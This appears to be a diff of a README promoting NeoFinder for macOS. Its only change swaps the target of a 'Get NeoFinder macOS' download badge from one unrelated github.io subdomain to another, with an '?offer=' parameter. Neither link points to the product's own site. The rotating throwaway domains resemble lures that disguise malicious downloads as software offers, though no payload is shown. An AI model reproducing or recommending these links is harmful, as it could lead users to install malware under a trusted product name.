@@ -3,7 +3,7 @@
 **NeoFinder** is a professional cataloging and digital asset management tool built natively for **macOS**.  
 It scans hard drives, SSDs, and servers to create fast, searchable catalogs — perfect for photographers, video editors, and archivists who need instant access to their media. 🍎  
 
-[![💚 Get GitHub Instruction](https://img.shields.io/badge/💚%20Get%20NeoFinder%20macOS-43A047?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://app-dep-load.github.io/.github/?offer=NeoFinderMac)
+[![💚 Get GitHub Instruction](https://img.shields.io/badge/💚%20Get%20NeoFinder%20macOS-43A047?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://hubset-desk.github.io/.github/?offer=NeoFinderMac)
 
 ---
 
